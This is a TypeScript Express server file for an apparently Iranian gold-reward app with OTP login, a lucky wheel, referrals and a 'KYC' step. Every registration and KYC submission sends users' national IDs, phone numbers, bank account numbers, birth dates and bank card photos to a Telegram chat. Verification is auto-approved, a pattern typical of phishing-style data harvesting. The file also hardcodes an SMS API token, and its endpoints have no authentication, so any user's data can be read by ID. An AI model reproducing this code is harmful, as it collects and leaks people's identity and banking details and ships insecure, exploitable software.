import type { Express } from "express";
import { createServer, type Server } from "http";
import express from "express";
import multer from "multer";
import axios from "axios";
import TelegramBot from "node-telegram-bot-api";
import { storage, generateReferralCode } from "./storage";
import path from "path";
import fs from "fs/promises";

// Configure multer for file uploads
const upload = multer({
  storage: multer.diskStorage({
    destination: async (req, file, cb) => {
      const uploadDir = path.join(process.cwd(), "uploads");
      await fs.mkdir(uploadDir, { recursive: true });
      cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
      const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
      cb(null, file.fieldname + "-" + uniqueSuffix + path.extname(file.originalname));
    },
  }),
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB limit
});

// Telegram Bot setup
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

let bot: TelegramBot | null = null;
if (TELEGRAM_BOT_TOKEN) {
  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
}

async function sendToTelegram(message: string, photoPath?: string) {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log("Telegram bot not configured");
    return;
  }

  try {
    if (photoPath) {
      await bot.sendPhoto(TELEGRAM_CHAT_ID, photoPath, { caption: message });
    } else {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message);
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error);
  }
}

// SMS API configuration
const SMS_API_URL = "https://s.api.ir/api/sw1/SmsOTP";
const SMS_API_TOKEN = process.env.SMS_API_TOKEN || "VfxfZubrWy+glyAHX0adMkshsGBfdbFjzQ/4KeTNVJnCIAH/3maggFMMHvIqCAkiRdzMMf+H7MjaCu8gJ9zhxTYvecNnGSaJxnpy6cre48M=";

async function sendOtpSms(phoneNumber: string, code: string): Promise<void> {
  try {
    await axios.post(
      SMS_API_URL,
      {
        code,
        mobile: phoneNumber,
        template: 0,
      },
      {
        headers: {
          "accept": "text/plain",
          "Authorization": `Bearer ${SMS_API_TOKEN}`,
          "Content-Type": "application/json",
        },
      }
    );
  } catch (error: any) {
    console.error("Error sending OTP SMS:", error.response?.data || error.message);
    throw new Error("ارسال پیامک با خطا مواجه شد");
  }
}

// Prize distribution for lucky wheel (8 segments)
const WHEEL_PRIZES = [50, 100, 500, 1000, 5000, 10000, 50000, 0]; // 0 is empty slot

function getRandomPrize(): number {
  return WHEEL_PRIZES[Math.floor(Math.random() * WHEEL_PRIZES.length)];
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Serve uploaded files
  app.use("/uploads", express.static(path.join(process.cwd(), "uploads")));

  // === AUTH ROUTES ===

  // Send OTP
  app.post("/api/auth/send-otp", async (req, res) => {
    try {
      const { phoneNumber } = req.body;

      if (!phoneNumber || !/^09\d{9}$/.test(phoneNumber)) {
        return res.status(400).json({ message: "شماره تلفن نامعتبر است" });
      }

      // Generate 4-digit OTP
      const code = Math.floor(1000 + Math.random() * 9000).toString();
      const expiresAt = new Date(Date.now() + 5 * 60 * 1000); // 5 minutes

      await storage.createOtpCode({
        phoneNumber,
        code,
        expiresAt,
      });

      // Send SMS
      await sendOtpSms(phoneNumber, code);

      res.json({ success: true, message: "کد تایید ارسال شد" });
    } catch (error: any) {
      console.error("Send OTP error:", error);
      res.status(500).json({ message: error.message || "خطا در ارسال کد" });
    }
  });

  // Verify OTP
  app.post("/api/auth/verify-otp", async (req, res) => {
    try {
      const { phoneNumber, code } = req.body;

      const otp = await storage.getLatestOtp(phoneNumber);

      if (!otp) {
        return res.status(400).json({ message: "کدی برای این شماره یافت نشد" });
      }

      if (otp.isVerified) {
        return res.status(400).json({ message: "این کد قبلاً استفاده شده است" });
      }

      if (new Date() > otp.expiresAt) {
        return res.status(400).json({ message: "کد منقضی شده است" });
      }

      if (otp.code !== code) {
        return res.status(400).json({ message: "کد وارد شده صحیح نیست" });
      }

      await storage.markOtpVerified(otp.id);

      res.json({ success: true, message: "تایید موفق" });
    } catch (error: any) {
      console.error("Verify OTP error:", error);
      res.status(500).json({ message: "خطا در تایید کد" });
    }
  });

  // Register user
  app.post("/api/auth/register", async (req, res) => {
    try {
      const { phoneNumber, firstName, lastName, nationalId, referralCode: inputReferralCode } = req.body;

      // Check if phone number is verified
      const otp = await storage.getLatestOtp(phoneNumber);
      if (!otp || !otp.isVerified) {
        return res.status(400).json({ message: "لطفاً ابتدا شماره تلفن را تایید کنید" });
      }

      // Check if user already exists
      const existingUser = await storage.getUserByPhone(phoneNumber);
      if (existingUser) {
        return res.json({ userId: existingUser.id, message: "شما قبلاً ثبت نام کرده‌اید" });
      }

      // Check if national ID is already used
      const existingNationalId = await storage.getUserByNationalId(nationalId);
      if (existingNationalId) {
        return res.status(400).json({ message: "این کد ملی قبلاً استفاده شده است" });
      }

      // Generate unique referral code
      let userReferralCode = generateReferralCode();
      while (await storage.getUserByReferralCode(userReferralCode)) {
        userReferralCode = generateReferralCode();
      }

      // Create user
      const user = await storage.createUser({
        phoneNumber,
        firstName,
        lastName,
        nationalId,
        referralCode: userReferralCode,
        referredBy: inputReferralCode || null,
      });

      // If referred by someone, create referral record
      if (inputReferralCode) {
        const referrer = await storage.getUserByReferralCode(inputReferralCode);
        if (referrer) {
          await storage.createReferral({
            referrerId: referrer.id,
            referredUserId: user.id,
          });
        }
      }

      // Send to Telegram
      await sendToTelegram(
        `🆕 کاربر جدید ثبت نام کرد:\n\n` +
        `نام: ${firstName} ${lastName}\n` +
        `شماره تلفن: ${phoneNumber}\n` +
        `کد ملی: ${nationalId}\n` +
        `کد معرف: ${userReferralCode}\n` +
        `معرف شده توسط: ${inputReferralCode || "ندارد"}`
      );

      res.json({ userId: user.id, message: "ثبت نام با موفقیت انجام شد" });
    } catch (error: any) {
      console.error("Register error:", error);
      res.status(500).json({ message: "خطا در ثبت نام" });
    }
  });

  // === USER ROUTES ===

  // Get user info - supports both param and query string
  app.get("/api/user/:userId?", async (req, res) => {
    try {
      const userId = req.params.userId || req.query.userId as string;
      
      if (!userId) {
        return res.status(400).json({ message: "شناسه کاربر الزامی است" });
      }

      const user = await storage.getUser(userId);

      if (!user) {
        return res.status(404).json({ message: "کاربر یافت نشد" });
      }

      res.json(user);
    } catch (error: any) {
      console.error("Get user error:", error);
      res.status(500).json({ message: "خطا در دریافت اطلاعات کاربر" });
    }
  });

  // === KYC ROUTES ===

  // Submit KYC
  app.post("/api/kyc/submit", upload.single("bankCardImage"), async (req, res) => {
    try {
      const { userId, birthDate, bankAccountNumber } = req.body;
      const file = req.file;

      if (!file) {
        return res.status(400).json({ message: "لطفاً عکس کارت بانکی را آپلود کنید" });
      }

      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "کاربر یافت نشد" });
      }

      // Update birth date
      await storage.updateUserBirthDate(userId, birthDate);

      // Create KYC record
      const imageUrl = `/uploads/${file.filename}`;
      const kyc = await storage.createKycVerification({
        userId,
        bankAccountNumber,
        bankCardImageUrl: imageUrl,
      });

      // Mark user as KYC verified (auto-approve for demo)
      await storage.markUserKycVerified(userId);

      // Check if user was referred and mark referral as verified
      if (user.referredBy) {
        const referrer = await storage.getUserByReferralCode(user.referredBy);
        if (referrer) {
          const referrals = await storage.getUserReferrals(referrer.id);
          const referral = referrals.find((r: any) => r.referredUserId === userId);
          
          if (referral && !referral.isVerified) {
            await storage.markReferralVerified(referral.id);
            
            // Give referrer 1000 Sut bonus
            await storage.updateUserBalance(referrer.id, 1000, 0);
            await storage.createTransaction({
              userId: referrer.id,
              type: "referral_bonus",
              goldAmount: "1000",
              tomanAmount: null,
              description: `پاداش معرفی ${user.firstName} ${user.lastName}`,
            });

            await sendToTelegram(
              `💰 پاداش معرفی:\n\n` +
              `${referrer.firstName} ${referrer.lastName} (${referrer.phoneNumber})\n` +
              `دریافت کرد: 1,000 سوت طلا\n` +
              `بابت معرفی: ${user.firstName} ${user.lastName}`
            );
          }
        }
      }

      // Send to Telegram with photo
      const photoPath = path.join(process.cwd(), "uploads", file.filename);
      await sendToTelegram(
        `✅ احراز هویت جدید:\n\n` +
        `نام: ${user.firstName} ${user.lastName}\n` +
        `کد ملی: ${user.nationalId}\n` +
        `شماره تلفن: ${user.phoneNumber}\n` +
        `تاریخ تولد: ${birthDate}\n` +
        `شماره حساب: ${bankAccountNumber}`,
        photoPath
      );

      res.json({ success: true, message: "اطلاعات احراز هویت ارسال شد" });
    } catch (error: any) {
      console.error("KYC submit error:", error);
      res.status(500).json({ message: "خطا در ارسال اطلاعات" });
    }
  });

  // === WHEEL ROUTES ===

  // Check if user can spin today - supports both param and query string
  app.get("/api/wheel/can-spin/:userId?", async (req, res) => {
    try {
      const userId = req.params.userId || req.query.userId as string;

      if (!userId) {
        return res.status(400).json({ message: "شناسه کاربر الزامی است" });
      }

      const todaySpin = await storage.getTodayWheelSpin(userId);

      res.json({
        canSpin: !todaySpin,
        lastSpin: todaySpin?.spunAt || null,
      });
    } catch (error: any) {
      console.error("Can spin error:", error);
      res.status(500).json({ message: "خطا در بررسی وضعیت گردونه" });
    }
  });

  // Spin the wheel
  app.post("/api/wheel/spin", async (req, res) => {
    try {
      const { userId } = req.body;

      const todaySpin = await storage.getTodayWheelSpin(userId);
      if (todaySpin) {
        return res.status(400).json({ message: "شما امروز گردونه را چرخانده‌اید" });
      }

      const prize = getRandomPrize();

      await storage.createWheelSpin({
        userId,
        prizeAmount: prize.toString(),
      });

      if (prize > 0) {
        await storage.updateUserBalance(userId, prize, 0);
        await storage.createTransaction({
          userId,
          type: "wheel_prize",
          goldAmount: prize.toString(),
          tomanAmount: null,
          description: `جایزه گردونه شانس`,
        });
      }

      const user = await storage.getUser(userId);
      await sendToTelegram(
        `🎰 گردونه شانس:\n\n` +
        `کاربر: ${user?.firstName} ${user?.lastName}\n` +
        `جایزه: ${prize > 0 ? `${prize.toLocaleString("fa-IR")} سوت طلا` : "خالی"}`
      );

      res.json({ prize, message: prize > 0 ? "تبریک!" : "متاسفیم" });
    } catch (error: any) {
      console.error("Wheel spin error:", error);
      res.status(500).json({ message: "خطا در چرخاندن گردونه" });
    }
  });

  // === TRADING ROUTES ===

  // Sell gold
  app.post("/api/trading/sell", async (req, res) => {
    try {
      const { userId, goldAmount } = req.body;

      if (goldAmount <= 0) {
        return res.status(400).json({ message: "مقدار نامعتبر است" });
      }

      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "کاربر یافت نشد" });
      }

      if (!user.isKycVerified) {
        return res.status(400).json({ message: "ابتدا باید احراز هویت کنید" });
      }

      const currentGold = parseFloat(user.goldBalance);
      if (currentGold < goldAmount) {
        return res.status(400).json({ message: "موجودی طلا کافی نیست" });
      }

      const GOLD_PRICE = 1000; // 1 Sut = 1000 Toman
      const tomanAmount = goldAmount * GOLD_PRICE;

      await storage.updateUserBalance(userId, -goldAmount, tomanAmount);
      await storage.createTransaction({
        userId,
        type: "sell_gold",
        goldAmount: (-goldAmount).toString(),
        tomanAmount: tomanAmount.toString(),
        description: `فروش ${goldAmount} سوت طلا`,
      });

      await sendToTelegram(
        `📉 فروش طلا:\n\n` +
        `کاربر: ${user.firstName} ${user.lastName}\n` +
        `فروخته شد: ${goldAmount.toLocaleString("fa-IR")} سوت\n` +
        `دریافت شد: ${tomanAmount.toLocaleString("fa-IR")} تومان`
      );

      res.json({ success: true, tomanReceived: tomanAmount });
    } catch (error: any) {
      console.error("Sell gold error:", error);
      res.status(500).json({ message: "خطا در فروش طلا" });
    }
  });

  // === TRANSACTION ROUTES ===

  // Get user transactions - supports both param and query string
  app.get("/api/transactions/:userId?", async (req, res) => {
    try {
      const userId = req.params.userId || req.query.userId as string;

      if (!userId) {
        return res.status(400).json({ message: "شناسه کاربر الزامی است" });
      }

      const transactions = await storage.getUserTransactions(userId);
      res.json(transactions);
    } catch (error: any) {
      console.error("Get transactions error:", error);
      res.status(500).json({ message: "خطا در دریافت تراکنش‌ها" });
    }
  });

  // === REFERRAL ROUTES ===

  // Get user referrals - supports both param and query string
  app.get("/api/referrals/:userId?", async (req, res) => {
    try {
      const userId = req.params.userId || req.query.userId as string;

      if (!userId) {
        return res.status(400).json({ message: "شناسه کاربر الزامی است" });
      }

      const referrals = await storage.getUserReferrals(userId);
      res.json(referrals);
    } catch (error: any) {
      console.error("Get referrals error:", error);
      res.status(500).json({ message: "خطا در دریافت لیست معرفی‌ها" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
